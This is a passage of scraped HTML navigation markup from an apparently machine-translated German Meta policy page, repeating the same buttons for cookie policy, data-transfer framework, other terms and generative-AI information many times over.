                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
